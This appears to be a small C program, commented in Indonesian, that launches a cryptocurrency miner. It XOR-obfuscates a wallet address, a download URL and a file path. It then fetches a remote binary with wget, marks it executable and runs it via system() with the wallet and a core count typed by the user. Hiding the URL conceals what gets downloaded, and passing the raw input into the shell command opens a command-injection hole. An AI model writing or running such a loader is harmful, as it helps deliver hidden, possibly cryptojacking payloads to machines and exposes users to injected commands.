#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>

// Fungsi untuk dekripsi string yang dienkripsi dengan XOR
void decrypt(char *data, int key) {
    for (int i = 0; data[i] != '\0'; i++) {
        data[i] ^= key;
    }
}

int main() {
    char qcore[20];
    // Wallet terenkripsi menggunakan XOR dengan key 0xAA
    char enc_wallet[] = {
        0xE2, 0xE0, 0xEF, 0xAB, 0xA7, 0xB4, 0x9A, 0xBE, 0xBC, 0x9A, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8,
        0xAB, 0xE0, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8,
        0xAB, 0xE0, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8,
        0xAB, 0xE0, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8,
        0xAB, 0xE0, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8,
        0xAB, 0xE0, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8,
        0xAB, 0xE0, 0xE2, 0xE8, 0x00
    };
    char wallet[sizeof(enc_wallet)];
    strcpy(wallet, enc_wallet);
    decrypt(wallet, 0xAA);

    // String terenkripsi untuk URL dan path
    char enc_url[] = {0xFB, 0x9F, 0x88, 0x88, 0x9A, 0xCD, 0x9E, 0x8B, 0x8D, 0xCF, 0x8A, 0x9C, 0x9B, 0xDF, 0x98, 0x9D, 0x8E, 0xCF, 0x9C, 0x9B, 0x8A, 0xCF, 0x8A, 0x9C, 0x9B, 0xDF, 0x9E, 0x8D, 0x8A, 0x8F, 0x9E, 0xCD, 0x8C, 0x9B, 0x88, 0xCF, 0x9B, 0x88, 0x9F, 0x8E, 0xCF, 0x9C, 0x89, 0x9B, 0xCD, 0x88, 0x9B, 0x8A, 0x9C, 0xCD, 0x9C, 0x8A, 0x9B, 0x00};
    char enc_path[] = {0x9A, 0x9D, 0x9E, 0x9B, 0xCE, 0x9C, 0x9D, 0x00};
    
    char url[sizeof(enc_url)];
    char path[sizeof(enc_path)];
    strcpy(url, enc_url);
    strcpy(path, enc_path);
    decrypt(url, 0xFF);
    decrypt(path, 0xFF);

    char command[256];
    pid_t pid;

    // Download file dengan fork dan exec (tanpa sudo)
    pid = fork();
    if (pid == 0) {
        execlp("wget", "wget", "-q", url, "-O", path, NULL);
        exit(1);
    } else {
        waitpid(pid, NULL, 0);
    }

    // Memberikan izin eksekusi (tanpa sudo)
    pid = fork();
    if (pid == 0) {
        execlp("chmod", "chmod", "+x", path, NULL);
        exit(1);
    } else {
        waitpid(pid, NULL, 0);
    }

    printf("Masukan jumlah core: ");
    fflush(stdout);
    
    if (fgets(qcore, sizeof(qcore), stdin) == NULL) {
        return 1;
    }
    
    qcore[strcspn(qcore, "\n")] = '\0';
    
    // Membuat perintah dengan eksekusi langsung
    snprintf(command, sizeof(command), "%s %s %s", path, qcore, wallet);
    
    int status = system(command);
    
    if (status == -1) {
        return 1;
    }
    
    return 0;
}
